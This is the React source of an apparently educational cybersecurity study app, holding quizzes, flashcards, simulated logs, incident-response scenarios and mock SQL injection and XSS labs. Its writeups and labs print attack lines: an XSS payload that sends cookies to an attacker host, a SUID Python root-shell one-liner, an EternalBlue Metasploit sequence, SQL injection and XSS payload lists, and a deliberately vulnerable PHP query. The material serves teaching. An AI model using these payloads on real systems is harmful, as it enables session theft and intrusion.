import { useState, useEffect } from "react";
import ToolsPage from "./components/ToolsPage";
import FlashcardsPage from "./components/FlashcardsPage";
import MockTestsPage from "./components/MockTestsPage";
import LearnPage from "./components/LearnPage";

// ── DATA ──────────────────────────────────────────────────────────────────────

const MCQ_DATA = [
  { q:"What does 'XSS' stand for?", opts:["Extra Secure Script","Cross-Site Scripting","External Script Source","Cross-System Security"], ans:1, exp:"XSS = Cross-Site Scripting. Attackers inject malicious JS into trusted websites to steal cookies, hijack sessions, or deface pages." },
  { q:"Which port does HTTPS run on by default?", opts:["80","8080","443","3389"], ans:2, exp:"HTTPS runs on port 443. HTTP uses port 80. RDP uses 3389. 8080 is often used for HTTP proxies/dev servers." },
  { q:"What is a 'zero-day' vulnerability?", opts:["A bug fixed the same day it's found","An unknown vulnerability with no available patch","A vulnerability that exists for 0 seconds","A first-day pentest finding"], ans:1, exp:"Zero-day = vulnerability unknown to the vendor with no patch available. Extremely valuable to attackers and nation-states." },
  { q:"What does Nmap primarily do?", opts:["Crack password hashes","Network scanning and port discovery","Decrypt SSL/TLS traffic","Analyze malware binaries"], ans:1, exp:"Nmap (Network Mapper) discovers hosts, open ports, running services, and OS versions. Foundation of all reconnaissance." },
  { q:"In SQL injection, what does ' OR '1'='1 achieve?", opts:["Creates a new admin user","Makes the WHERE condition always TRUE — bypasses auth","Deletes the database","Encrypts the SQL query"], ans:1, exp:"This payload makes the WHERE clause evaluate to TRUE for every row, effectively bypassing login without knowing the password." },
  { q:"The CIA Triad in cybersecurity stands for?", opts:["Confidentiality, Integrity, Availability","Control, Inspect, Audit","Cipher, Inject, Attack","Central Intelligence Agency"], ans:0, exp:"CIA = Confidentiality (data hidden from unauthorized), Integrity (data not tampered), Availability (system accessible). Core infosec principles." },
  { q:"What is a 'buffer overflow' vulnerability?", opts:["Server crashes from too many requests","Writing more data than allocated memory can hold, potentially executing code","A network packet flood attack","Memory leak causing server slowdown"], ans:1, exp:"Buffer overflow = writing beyond allocated memory boundary. Can overwrite return addresses, enabling arbitrary code execution. Classic exploit technique." },
  { q:"What does SIEM stand for?", opts:["Security Information & Event Management","Secure Internet & Email Monitor","System Intrusion Event Mapper","Structured Incident Entry Module"], ans:0, exp:"SIEM = Security Information & Event Management. Aggregates logs from across the network, correlates events, and alerts on suspicious patterns." },
  { q:"Burp Suite is primarily used for?", opts:["Network packet capture","Web application security testing","Password cracking","Wireless network attacks"], ans:1, exp:"Burp Suite intercepts HTTP/S traffic, modifies requests, fuzzes parameters, and helps find web vulns like SQLi, XSS, IDOR, SSRF." },
  { q:"What is OSINT?", opts:["Open Source Intelligence","Online Security Integration Tool","Offensive Scanning & Indexing Network","Output Security Inspection Tool"], ans:0, exp:"OSINT = Open Source Intelligence. Gathering information from publicly available sources — social media, DNS records, job postings, GitHub, etc." },
];

const FLASHCARDS = [
  { f:"Port 22", b:"SSH — Secure Shell\nEncrypted remote terminal access" },
  { f:"Port 80", b:"HTTP — HyperText Transfer Protocol\nUnencrypted web traffic" },
  { f:"Port 443", b:"HTTPS — HTTP over TLS/SSL\nEncrypted web traffic" },
  { f:"Port 3389", b:"RDP — Remote Desktop Protocol\nWindows remote desktop (common attack target)" },
  { f:"Port 21", b:"FTP — File Transfer Protocol\nFile transfer, often with anonymous login enabled" },
  { f:"Port 53", b:"DNS — Domain Name System\nResolves domain names to IP addresses" },
  { f:"Port 25", b:"SMTP — Simple Mail Transfer Protocol\nSending email between mail servers" },
  { f:"ARP Spoofing", b:"Links attacker's MAC to victim's IP\n→ Enables Man-in-the-Middle attacks\n→ Intercept/modify traffic" },
  { f:"SQL Injection", b:"Injects SQL code into input fields\nGoa: bypass auth, dump DB, modify data\nFix: parameterized queries" },
  { f:"CSRF Attack", b:"Cross-Site Request Forgery\nTricks authenticated user into making\nunintended requests\nFix: CSRF tokens" },
  { f:"CVE", b:"Common Vulnerabilities & Exposures\nStandardized ID for known vulnerabilities\nFormat: CVE-YEAR-NUMBER" },
  { f:"Privilege Escalation", b:"Gaining higher rights than intended\nVertical: user → admin\nHorizontal: user A → user B's data" },
];

const LOGS = [
  { id:1, time:"08:01:14", src:"10.0.0.55", event:"User authenticated successfully — john.doe", level:"INFO", suspicious:false },
  { id:2, time:"08:07:22", src:"10.0.0.30", event:"DNS query resolved: google.com → 142.250.80.46", level:"INFO", suspicious:false },
  { id:3, time:"08:14:01", src:"185.220.101.47", event:"SSH login FAILED — root [attempt 1/5]", level:"WARN", suspicious:false },
  { id:4, time:"08:14:04", src:"185.220.101.47", event:"SSH login FAILED — root [attempt 2/5]", level:"WARN", suspicious:true },
  { id:5, time:"08:14:06", src:"185.220.101.47", event:"SSH login FAILED — admin [attempt 3/5]", level:"WARN", suspicious:true },
  { id:6, time:"08:14:09", src:"185.220.101.47", event:"SSH login FAILED — administrator [attempt 4/5]", level:"WARN", suspicious:true },
  { id:7, time:"08:14:12", src:"185.220.101.47", event:"SSH login FAILED — root [attempt 5/5]", level:"CRIT", suspicious:true },
  { id:8, time:"08:15:30", src:"10.0.0.12", event:"File read: /var/www/html/index.php", level:"INFO", suspicious:false },
  { id:9, time:"08:16:44", src:"10.0.0.77", event:"PORT SCAN DETECTED — 1,024 ports probed in 1.8 seconds", level:"CRIT", suspicious:true },
  { id:10, time:"08:17:01", src:"10.0.0.50", event:"Scheduled backup completed successfully", level:"INFO", suspicious:false },
  { id:11, time:"08:18:55", src:"10.0.0.77", event:"SSH login SUCCESS after port scan — root", level:"CRIT", suspicious:true },
  { id:12, time:"08:19:11", src:"10.0.0.22", event:"Outbound connection established: port 4444 → 185.220.101.47 (reverse shell?)", level:"CRIT", suspicious:true },
  { id:13, time:"08:20:00", src:"10.0.0.88", event:"Normal file read: /home/alice/documents/q4-report.pdf", level:"INFO", suspicious:false },
  { id:14, time:"08:21:33", src:"10.0.0.22", event:"Data transfer: 2.8GB sent to 185.220.101.47 (data exfiltration?)", level:"CRIT", suspicious:true },
  { id:15, time:"08:22:10", src:"10.0.0.33", event:"User logout — jane.smith", level:"INFO", suspicious:false },
];

const TOOLS = [
  { name:"Nmap", icon:"🔍", cat:"Reconnaissance", color:"#00ff88", cmd:"nmap -sV -sC -p- 192.168.1.0/24", story:"Scanned lab subnet, discovered 8 hosts. On 10.0.0.22: found SSH port 22 running OpenSSH 7.4 (vulnerable to CVE-2018-15473 user enumeration), MySQL 3306 exposed to internet, FTP 21 with anonymous login. Reported 3 critical findings." },
  { name:"Burp Suite", icon:"🕷️", cat:"Web App Testing", color:"#ff8800", cmd:"Proxy → Intercept → Modify Request → Forward", story:"Intercepted POST /login request on DVWA. Modified 'username' param to: admin'-- — server returned 302 redirect to dashboard without password verification. Found SQL injection → authentication bypass in under 3 minutes." },
  { name:"Metasploit", icon:"💥", cat:"Exploitation", color:"#ff4444", cmd:"use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.5\nrun", story:"Exploited EternalBlue on unpatched Windows 7 target in isolated lab. Obtained SYSTEM-level shell, dumped password hashes with hashdump. Demonstrated why patching KB4012212 is non-negotiable." },
  { name:"Wireshark", icon:"📡", cat:"Traffic Analysis", color:"#00bfff", cmd:"Filter: http.request.method == POST\nor: tcp.port == 21", story:"Captured HTTP login traffic on lab LAN (non-HTTPS). Applied POST filter, located credentials in plaintext within packet data: user=admin&pass=admin123. Demonstrated need for TLS on all login forms." },
  { name:"Hashcat", icon:"🔓", cat:"Password Cracking", color:"#ffaa00", cmd:"hashcat -m 0 -a 0 hashes.txt rockyou.txt\n# -m 0 = MD5, -a 0 = dictionary attack", story:"Recovered 8-char MD5 password 'sunshine1' in 23 seconds using rockyou.txt wordlist (14M words). Same hash took 0.3s with GPU. Demonstrated why MD5 is insecure and bcrypt/Argon2 are required for passwords." },
  { name:"OWASP ZAP", icon:"⚡", cat:"Automated Scanning", color:"#aa44ff", cmd:"Active Scan → Spider crawl → Alert Review → Export", story:"Automated scan on DVWA found: SQL injection (3 endpoints), Reflected XSS (5 inputs), CSRF (2 forms), directory traversal (/etc/passwd readable). Generated PDF report with remediation recommendations. Saved ~4 hours vs manual testing." },
];

const WRITEUPS = [
  { title:"SQL Injection: Auth Bypass to Full DB Dump", platform:"TryHackMe", diff:"Medium", tags:["SQLi","MySQL","Web"], color:"#ff4444", steps:["Identified injection point in /login via quote test (')","ORDER BY 1,2,3... — found 3 columns","UNION SELECT null,null,null — confirmed union-based injection","Extracted DB name: information_schema.tables query","Dumped users table: 3 accounts with MD5 hashes","Cracked hashes with hashcat + rockyou.txt in 2 min","Logged in as admin — full application takeover"] },
  { title:"Stored XSS → Admin Session Hijacking", platform:"HackTheBox", diff:"Medium", tags:["XSS","Cookies","JavaScript"], color:"#ff8800", steps:["Found stored XSS in blog comment section","Injected: <script>fetch('http://10.9.0.1:8000/?c='+document.cookie)</script>","Started Python HTTP server on attacker machine","Waited for admin to view comments page","Received: admin session cookie in HTTP request log","Used stolen cookie in browser → accessed /admin panel","Confirmed admin access — full account takeover"] },
  { title:"Brute Force Detection & IR in Splunk", platform:"SOC Lab", diff:"Easy", tags:["Splunk","SIEM","Blue Team"], color:"#00bfff", steps:["Query: index=auth action=failure | stats count by src_ip","Found 847 failures from 185.220.101.47 in 10 minutes","Correlated: same IP had successful login 2 min after","Pivot on post-login activity: reverse shell on port 4444","Traced lateral movement to 3 internal hosts","Blocked IP at firewall, isolated compromised machines","Wrote incident report with full IOC list"] },
  { title:"Linux PrivEsc via Misconfigured SUID", platform:"TryHackMe", diff:"Hard", tags:["Linux","PrivEsc","SUID","GTFOBins"], color:"#00ff88", steps:["Gained initial shell as www-data via RCE","Ran: find / -perm -4000 2>/dev/null","Found: /usr/bin/python3 with SUID bit set!","GTFOBins payload: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'","Obtained root shell","Read /root/root.txt — room complete","Reported misconfigured SUID to platform"] },
];

const SCENARIOS = [
  { q:"You're SOC L1. You see 500 failed SSH login attempts from IP 185.220.101.47 within 60 seconds. What do you do?", verdict:"Brute Force Attack — HIGH Severity", steps:["IMMEDIATELY block IP at perimeter firewall (temp rule — 24hr)","Check: did ANY attempt succeed? (correlate with auth success logs)","Identify username list used — is it targeted (specific users) or dictionary?","GeoIP lookup — known threat actor range? Tor exit node?","Check same IP across all other hosts in network","IF successful login found → escalate to Tier 2, initiate IR plan","Create incident ticket: document IP, timestamps, usernames tried, action taken","Add IP to threat intel blacklist / SIEM watchlist"] },
  { q:"Alert fires at 2AM: 2.8GB of data transferred from internal host 10.0.0.22 to external IP, followed by a connection on port 4444.", verdict:"Active Compromise + Data Exfiltration — CRITICAL", steps:["IMMEDIATELY isolate 10.0.0.22 from network (pull virtual NIC or VLAN change)","Alert on-call IR team and management — do NOT wait till morning","Port 4444 = Metasploit default reverse shell listener — assume full compromise","Identify WHAT data was exfiltrated: file system audit, DLP logs","Preserve: memory dump + disk image before any remediation","Hunt: has the same external IP communicated with other internal hosts?","Check when host was first compromised (look back 30 days in logs)","Notify legal/compliance team — potential data breach reporting obligations"] },
  { q:"A user reports their browser redirects to random sites. IT confirms DNS settings on their machine changed. What's your assessment?", verdict:"DNS Hijacking / Malware Infection — HIGH", steps:["Isolate the machine — potential active malware infection","Run full malware scan: Malwarebytes + Windows Defender offline scan","Check current DNS settings vs. baseline (should be internal DNS server)","Inspect browser extensions — malicious extension could modify DNS","Check router/gateway DNS settings — possible router compromise","Review DHCP server logs — unauthorized DNS server being pushed?","Check other machines on same VLAN for similar behavior","If router compromised: factory reset, update firmware, change admin password","Document all IOCs: malicious DNS IPs, malware hashes, affected machines"] },
];

// ── STYLES ────────────────────────────────────────────────────────────────────

const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap');

:root{
  --bg-base:#0F1419;
  --bg-card:#161B22;
  --bg-card-hover:#1C2333;
  --bg-elevated:#1E2530;
  --border:#2D3748;
  --border-hover:#4A5568;
  --accent:#6C63FF;
  --accent-glow:#6C63FF40;
  --accent-soft:#6C63FF18;
  --accent2:#00B4D8;
  --accent3:#FF6B6B;
  --accent4:#FFA62B;
  --text-primary:#E2E8F0;
  --text-secondary:#A0AEC0;
  --text-muted:#718096;
  --text-dim:#4A5568;
  --success:#48BB78;
  --danger:#FC8181;
  --warning:#F6E05E;
}

*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg-base);color:var(--text-secondary);font-family:'Inter',sans-serif;font-size:15px;-webkit-font-smoothing:antialiased}

::-webkit-scrollbar{width:6px}
::-webkit-scrollbar-track{background:var(--bg-base)}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:var(--accent)}

::selection{background:var(--accent);color:#fff}

.mono{font-family:'JetBrains Mono',monospace}
.display{font-family:'Plus Jakarta Sans',sans-serif;font-weight:700;letter-spacing:-0.5px}

.card{
  background:var(--bg-card);
  border:1px solid var(--border);
  border-radius:12px;
  overflow:hidden;
  transition:border-color .2s,transform .2s
}
.card-glow{
  background:var(--bg-card);
  border:1px solid var(--border);
  border-radius:12px;
  overflow:hidden;
  transition:all .25s ease
}
.card-glow:hover{
  border-color:var(--border-hover);
  transform:translateY(-2px);
  box-shadow:0 8px 30px rgba(0,0,0,.3)
}

.tag{display:inline-block;padding:3px 10px;border-radius:6px;font-size:11px;font-family:'JetBrains Mono',monospace;margin:2px;font-weight:500}
.tag-green{background:#48BB7818;color:#48BB78;border:1px solid #48BB7830}
.tag-red{background:#FC818118;color:#FC8181;border:1px solid #FC818130}
.tag-blue{background:#00B4D818;color:#00B4D8;border:1px solid #00B4D830}
.tag-orange{background:#FFA62B18;color:#FFA62B;border:1px solid #FFA62B30}
.tag-purple{background:#6C63FF18;color:#6C63FF;border:1px solid #6C63FF30}

.btn{
  padding:10px 24px;border-radius:8px;cursor:pointer;
  font-family:'Inter',sans-serif;font-size:13px;font-weight:600;
  border:none;transition:all .2s;letter-spacing:0.3px
}
.btn-primary{
  background:linear-gradient(135deg,#6C63FF,#5A52D5);
  color:#fff;
  box-shadow:0 2px 12px rgba(108,99,255,.25)
}
.btn-primary:hover{box-shadow:0 4px 20px rgba(108,99,255,.4);transform:translateY(-1px)}
.btn-primary:disabled{opacity:.4;cursor:default;transform:none;box-shadow:none}
.btn-ghost{background:transparent;color:var(--accent);border:1px solid var(--accent)40}
.btn-ghost:hover{background:var(--accent-soft);border-color:var(--accent)}
.btn-danger{background:transparent;color:var(--danger);border:1px solid rgba(252,129,129,.3)}
.btn-danger:hover{background:rgba(252,129,129,.1)}

.cyber-input{
  background:var(--bg-base);border:1px solid var(--border);border-radius:8px;
  color:var(--text-primary);padding:12px 16px;font-family:'Inter',sans-serif;
  font-size:14px;width:100%;transition:all .2s;outline:none
}
.cyber-input:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-glow)}
.cyber-input::placeholder{color:var(--text-dim)}

.skill-bar{height:6px;background:var(--border);border-radius:4px;overflow:hidden;margin-top:5px}
.skill-fill{height:100%;border-radius:4px;background:linear-gradient(90deg,#6C63FF,#00B4D8);transition:width 1.2s cubic-bezier(.4,0,.2,1)}

.log-row{font-family:'JetBrains Mono',monospace;font-size:12px;padding:6px 12px;border-radius:6px;margin:2px 0;cursor:pointer;border:1px solid transparent;transition:all .15s;line-height:1.6}
.log-row:hover{background:var(--accent-soft);border-color:rgba(108,99,255,.2)}
.log-row.flagged{border-color:rgba(252,129,129,.4);background:rgba(252,129,129,.08)}
.log-row.correct-flag{border-color:var(--danger);background:rgba(252,129,129,.12);color:#FEB2B2}
.log-row.wrong-flag{border-color:rgba(246,224,94,.4);background:rgba(246,224,94,.08)}
.log-row.missed{border-color:rgba(252,129,129,.25);background:rgba(252,129,129,.05);color:#FEB2B2}

.mcq-opt{padding:14px 18px;border:1px solid var(--border);border-radius:10px;cursor:pointer;transition:all .2s;margin:8px 0;font-size:15px}
.mcq-opt:hover:not([disabled]){border-color:rgba(108,99,255,.4);background:var(--accent-soft)}
.mcq-opt.correct{border-color:var(--success)!important;background:rgba(72,187,120,.12)!important;color:var(--success)}
.mcq-opt.wrong{border-color:var(--danger)!important;background:rgba(252,129,129,.12)!important;color:var(--danger)}

.fc{
  background:linear-gradient(135deg,var(--bg-card),var(--bg-elevated));
  border:1px solid var(--border);border-radius:16px;padding:36px;
  text-align:center;cursor:pointer;min-height:180px;
  display:flex;align-items:center;justify-content:center;flex-direction:column;
  transition:all .3s;position:relative;overflow:hidden
}
.fc:hover{border-color:rgba(0,180,216,.4);transform:translateY(-3px);box-shadow:0 12px 40px rgba(0,180,216,.1)}
.fc::after{content:'click to flip';position:absolute;bottom:12px;right:14px;font-size:11px;color:var(--text-dim);font-family:'JetBrains Mono',monospace}

.nav-link{
  display:flex;align-items:center;gap:7px;padding:8px 14px;border-radius:8px;
  cursor:pointer;font-family:'Inter',sans-serif;font-size:12px;font-weight:500;
  color:var(--text-muted);border:1px solid transparent;transition:all .2s;white-space:nowrap
}
.nav-link:hover{color:var(--text-primary);background:var(--bg-elevated)}
.nav-link.active{color:var(--accent);border-color:rgba(108,99,255,.3);background:var(--accent-soft)}

@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
.fade-up{animation:fadeUp .4s ease}

@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
.cursor{animation:blink 1s infinite;font-family:'JetBrains Mono',monospace}

.table-style{width:100%;border-collapse:collapse;font-family:'JetBrains Mono',monospace;font-size:12px}
.table-style th{color:var(--accent);padding:8px 10px;border-bottom:1px solid var(--border);text-align:left;font-weight:600}
.table-style td{padding:6px 10px;border-bottom:1px solid rgba(45,55,72,.5)}

/* Study-friendly background pattern */
.study-bg{
  background-color:var(--bg-base);
  background-image:
    radial-gradient(rgba(108,99,255,.03) 1px, transparent 1px),
    radial-gradient(rgba(0,180,216,.02) 1px, transparent 1px);
  background-size:40px 40px, 80px 80px;
  background-position:0 0, 40px 40px
}
`;

// ── SUBCOMPONENTS ──────────────────────────────────────────────────────────────

function SectionTitle({ icon, title, sub }) {
  return (
    <div style={{ marginBottom: 24 }}>
      <h2 className="display" style={{ fontSize: 28, color: "var(--text-primary)", lineHeight: 1 }}>
        <span style={{ color: "var(--accent)", marginRight: 8 }}>{icon}</span>{title}
      </h2>
      {sub && <p className="mono" style={{ color: "var(--text-dim)", fontSize: 11, marginTop: 6 }}># {sub}</p>}
    </div>
  );
}

function Badge({ label, color = "#6C63FF" }) {
  return (
    <span style={{ background: color + "18", border: `1px solid ${color}40`, color, padding: "3px 10px", borderRadius: 6, fontSize: 11, fontFamily: "'JetBrains Mono', monospace", fontWeight: 500 }}>
      {label}
    </span>
  );
}

// ── DASHBOARD ──────────────────────────────────────────────────────────────────

function Dashboard({ stats, onNav }) {
  const skills = [
    { name:"Penetration Testing", pct:78 },{ name:"Web App Security (OWASP)", pct:84 },
    { name:"Python Scripting", pct:88 },{ name:"Network Analysis", pct:70 },
    { name:"SIEM / Log Analysis", pct:65 },{ name:"Malware Analysis", pct:62 },
    { name:"OSINT Techniques", pct:75 },{ name:"CTF Competitions", pct:73 },
  ];
  return (
    <div className="fade-up">
      {/* Hero */}
      <div style={{ textAlign: "center", padding: "40px 0 24px", position: "relative" }}>
        <div style={{ display: "inline-block", background: "var(--accent-soft)", border: "1px solid rgba(108,99,255,.3)", borderRadius: 8, padding: "6px 16px", marginBottom: 12 }}>
          <span style={{ fontSize: 12, color: "var(--accent)", fontWeight: 500 }}>📚 Your Cybersecurity Learning Hub</span>
        </div>
        <h1 className="display" style={{ fontSize: 48, color: "var(--text-primary)", lineHeight: 1.1, marginBottom: 10 }}>Learn Cybersecurity<br/><span style={{ color: "var(--accent)" }}>From Zero to Hero</span></h1>
        <p style={{ fontSize: 16, color: "var(--text-muted)", maxWidth: 600, margin: "0 auto 20px", lineHeight: 1.7 }}>
          Master Ethical Hacking, SOC Analysis & Penetration Testing — even if you've never touched a terminal before.
        </p>
        <div style={{ display: "flex", gap: 8, justifyContent: "center", flexWrap: "wrap" }}>
          {["Ethical Hacking","SOC L1 Analyst","Penetration Testing","Network Security","Web App Security","Incident Response"].map(s => (
            <span key={s} className="tag tag-green">{s}</span>
          ))}
        </div>
      </div>

      {/* Stats */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 14, margin: "28px 0" }}>
        {[
          { label:"Labs Completed", val:stats.labs, unit:"+", color:"#6C63FF", icon:"⚡" },
          { label:"Vulns Found", val:stats.vulns, unit:"+", color:"#FF6B6B", icon:"🔥" },
          { label:"Tools Mastered", val:stats.tools, unit:"+", color:"#00B4D8", icon:"🛠" },
          { label:"CTF Challenges", val:stats.ctf, unit:"+", color:"#FFA62B", icon:"🏆" },
        ].map(s => (
          <div key={s.label} className="card" style={{ padding: 22, textAlign: "center", borderColor: s.color + "25" }}>
            <div style={{ fontSize: 22, marginBottom: 6 }}>{s.icon}</div>
            <div className="display" style={{ fontSize: 40, color: s.color, lineHeight: 1 }}>{s.val}{s.unit}</div>
            <div style={{ fontSize: 12, color: "var(--text-muted)", marginTop: 6 }}>{s.label}</div>
          </div>
        ))}
      </div>

      {/* Skills + Quick Links */}
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 20 }}>
        <div className="card" style={{ padding: 24 }}>
          <div style={{ fontSize: 14, fontWeight: 600, color: "var(--text-primary)", marginBottom: 16, display: "flex", alignItems: "center", gap: 8 }}>
            <span style={{ color: "var(--accent)" }}>📊</span> Your Skill Progress
          </div>
          {skills.map(s => (
            <div key={s.name} style={{ marginBottom: 12 }}>
              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 13 }}>
                <span style={{ color: "var(--text-secondary)" }}>{s.name}</span>
                <span className="mono" style={{ color: "var(--accent)", fontSize: 11 }}>{s.pct}%</span>
              </div>
              <div className="skill-bar">
                <div className="skill-fill" style={{ width: s.pct + "%" }} />
              </div>
            </div>
          ))}
        </div>
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          {[
            { icon:"📚", title:"Start Learning (From Zero!)", desc:"Core concepts, roadmaps, glossary — everything explained simply", sec:"learn", color:"#6C63FF" },
            { icon:"🛠", title:"Tools Command Reference", desc:"15+ tools, basic → advanced commands with explanations", sec:"toolsref", color:"#48BB78" },
            { icon:"🃏", title:"120+ Flashcards", desc:"Ports, attacks, defense, crypto, IR — all categories", sec:"flashcards", color:"#00B4D8" },
            { icon:"📝", title:"Mock Tests (5 Exams)", desc:"Timed tests, scoring, detailed review", sec:"mocktests", color:"#FFA62B" },
            { icon:"⚡", title:"Hands-On Labs", desc:"SQLi, XSS, port scanner — live simulations", sec:"labs", color:"#FF6B6B" },
            { icon:"📊", title:"SOC Simulator", desc:"Analyze real logs, detect threats live", sec:"soc", color:"#7B68EE" },
          ].map(l => (
            <div key={l.sec} className="card-glow" style={{ padding: 16, cursor: "pointer", borderColor: l.color + "22" }} onClick={() => onNav(l.sec)}>
              <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                <span style={{ fontSize: 22 }}>{l.icon}</span>
                <div style={{ flex: 1 }}>
                  <div style={{ fontWeight: 600, color: "var(--text-primary)", fontSize: 14 }}>{l.title}</div>
                  <div style={{ fontSize: 12, color: "var(--text-muted)" }}>{l.desc}</div>
                </div>
                <span style={{ color: l.color, fontSize: 16 }}>→</span>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ── LABS ──────────────────────────────────────────────────────────────────────

function Labs() {
  const [sqlUser, setSqlUser] = useState("");
  const [sqlPass, setSqlPass] = useState("");
  const [sqlRes, setSqlRes] = useState(null);
  const [xssInput, setXssInput] = useState("");
  const [xssRes, setXssRes] = useState(null);
  const [scanActive, setScanActive] = useState(false);
  const [scanResults, setScanResults] = useState([]);

  const handleSQLi = () => {
    const u = sqlUser.toLowerCase();
    if (u.includes("'") || u.includes(" or ") || u.includes("--") || u.includes("1=1")) {
      setSqlRes({ ok: true, msg: "💥 ACCESS GRANTED — SQL Injection Successful!", detail: `Executed Query:\nSELECT * FROM users WHERE username='${sqlUser}' AND password='${sqlPass}'\n\nResult: WHERE clause evaluated to TRUE → Authentication bypassed without knowing the password!\n\nWelcome, Admin. You have full access to the application.` });
    } else if (sqlUser === "admin" && sqlPass === "admin123") {
      setSqlRes({ ok: true, msg: "✓ Login successful (correct credentials)", detail: "Normal login path — credentials matched database.\n\nNow try injection:\n• Username: admin'--\n• Username: ' OR '1'='1\n• Username: 1' OR '1'='1'--" });
    } else {
      setSqlRes({ ok: false, msg: "✗ Invalid credentials — access denied", detail: `Hint: Try SQL injection payloads:\n• admin'--\n• ' OR '1'='1\n• ' OR 1=1--\n\nOr login normally: admin / admin123` });
    }
  };

  const handleXSS = () => {
    const i = xssInput.toLowerCase();
    if (i.includes("<script") || i.includes("onerror") || i.includes("onload") || i.includes("alert(") || i.includes("javascript:") || i.includes("<svg")) {
      setXssRes({ vuln: true, msg: "⚡ XSS PAYLOAD EXECUTED IN BROWSER CONTEXT!", detail: `Your JavaScript ran unsanitized!\n\nReal-world impact:\n→ document.cookie  — steal session tokens\n→ keylogger  — capture all keystrokes\n→ window.location  — redirect to phishing page\n→ fetch(attacker_server, data)  — exfiltrate data\n\nFix: Sanitize input with DOMPurify, use CSP headers,\nencode output with htmlspecialchars()` });
    } else {
      setXssRes({ vuln: false, msg: "Input rendered safely — no XSS detected", detail: `Try these payloads:\n• <script>alert('XSS')</script>\n• <img src=x onerror=alert(document.cookie)>\n• <svg onload=alert(1)>\n• javascript:alert(1)` });
    }
  };

  const startScan = () => {
    if (scanActive) return;
    setScanActive(true);
    setScanResults([]);
    const ports = [
      { port:22, state:"open", service:"SSH", ver:"OpenSSH 7.4p1", note:"⚠️ CVE-2018-15473 (user enumeration)" },
      { port:80, state:"open", service:"HTTP", ver:"Apache 2.4.49", note:"🔴 CVE-2021-41773 (path traversal!)" },
      { port:443, state:"open", service:"HTTPS", ver:"Apache 2.4.49 TLS", note:"" },
      { port:21, state:"open", service:"FTP", ver:"vsftpd 3.0.3", note:"🔴 Anonymous login ENABLED" },
      { port:3306, state:"open", service:"MySQL", ver:"MySQL 5.7.32", note:"⚠️ Exposed to internet — critical!" },
      { port:8080, state:"filtered", service:"HTTP-alt", ver:"", note:"" },
      { port:4444, state:"closed", service:"—", ver:"", note:"" },
      { port:8888, state:"closed", service:"—", ver:"", note:"" },
    ];
    ports.forEach((p, i) => setTimeout(() => {
      setScanResults(prev => [...prev, p]);
      if (i === ports.length - 1) setScanActive(false);
    }, (i + 1) * 450));
  };

  return (
    <div className="fade-up">
      <SectionTitle icon="⚡" title="HANDS-ON LABS" sub="All simulations isolated — educational use only — no real targets" />

      {/* SQLi Lab */}
      <div className="card" style={{ padding: 24, marginBottom: 20, borderTop: "2px solid #ff444440" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 12 }}>
          <span className="tag tag-red">VULNERABLE APP</span>
          <span style={{ fontWeight: 600, fontSize: 16, color: "#fff" }}>SQL Injection — Authentication Bypass</span>
        </div>
        <p style={{ color: "#778", fontSize: 13, marginBottom: 14, lineHeight: 1.6 }}>
          This login form does NOT use parameterized queries. The SQL query is built by direct string concatenation — making it vulnerable to injection. Your goal: gain admin access without knowing the password.
        </p>
        <div className="card" style={{ padding: 12, marginBottom: 14, borderColor: "#1a1a1a" }}>
          <div className="mono" style={{ fontSize: 11, color: "#445", lineHeight: 1.8 }}>
            <span style={{ color: "#556" }}># Vulnerable PHP code (do NOT write this in production):</span><br/>
            <span style={{ color: "#ff8800" }}>$query</span> = <span style={{ color: "#00ff88" }}>"SELECT * FROM users WHERE username='"</span> . <span style={{ color: "#ff8800" }}>$_POST</span>['user'] . <span style={{ color: "#00ff88" }}>"' AND password='"</span> . <span style={{ color: "#ff8800" }}>$_POST</span>['pass'] . <span style={{ color: "#00ff88" }}>"'"</span>;
          </div>
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginBottom: 12 }}>
          <div>
            <label className="mono" style={{ display: "block", fontSize: 10, color: "#445", marginBottom: 5 }}>USERNAME</label>
            <input className="cyber-input" value={sqlUser} onChange={e => setSqlUser(e.target.value)} placeholder="admin' -- " onKeyDown={e => e.key === "Enter" && handleSQLi()} />
          </div>
          <div>
            <label className="mono" style={{ display: "block", fontSize: 10, color: "#445", marginBottom: 5 }}>PASSWORD</label>
            <input className="cyber-input" type="password" value={sqlPass} onChange={e => setSqlPass(e.target.value)} placeholder="anything..." onKeyDown={e => e.key === "Enter" && handleSQLi()} />
          </div>
        </div>
        <button className="btn btn-primary" onClick={handleSQLi}>ATTEMPT LOGIN</button>
        {sqlRes && (
          <div style={{ marginTop: 14, padding: 14, borderRadius: 6, background: sqlRes.ok ? "#00ff8810" : "#ff444410", border: `1px solid ${sqlRes.ok ? "#00ff8840" : "#ff444440"}` }}>
            <div style={{ fontWeight: 600, color: sqlRes.ok ? "#00ff88" : "#ff6666", marginBottom: 8 }}>{sqlRes.msg}</div>
            <pre className="mono" style={{ fontSize: 11, color: "#667", whiteSpace: "pre-wrap", margin: 0, lineHeight: 1.8 }}>{sqlRes.detail}</pre>
          </div>
        )}
      </div>

      {/* XSS Lab */}
      <div className="card" style={{ padding: 24, marginBottom: 20, borderTop: "2px solid #ff880040" }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 12 }}>
          <span className="tag tag-orange">VULNERABLE APP</span>
          <span style={{ fontWeight: 600, fontSize: 16, color: "#fff" }}>Cross-Site Scripting (XSS) Demo</span>
        </div>
        <p style={{ color: "#778", fontSize: 13, marginBottom: 14, lineHeight: 1.6 }}>
